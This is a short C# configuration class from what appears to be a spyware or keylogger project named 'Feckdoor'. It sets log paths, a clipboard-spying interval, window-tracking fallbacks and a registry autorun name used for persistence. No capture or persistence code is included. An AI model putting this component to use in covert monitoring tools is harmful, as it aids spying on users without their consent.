namespace Feckdoor
{
	internal class Config
	{
		public string LogFile
		{
			get; set;
		} = @"D:\Cache\Feckdoor.log";

		public string ErrorLogFile
		{
			get; set;
		} = @"D:\Cache\FeckdoorError.log";

		public int ClipboardSpyDelay
		{
			get; set;
		} = 200;

		public int TimestampDelay
		{
			get; set;
		} = 5000;

		public string FallbackWindowName
		{
			get; set;
		} = "Unknown window";

		public string FallbackWindowExecutableName
		{
			get; set;
		} = "Unknown executable";

		public string RegistryAutorunName
		{
			get; set;
		} = "Feckdoor";
	}
}
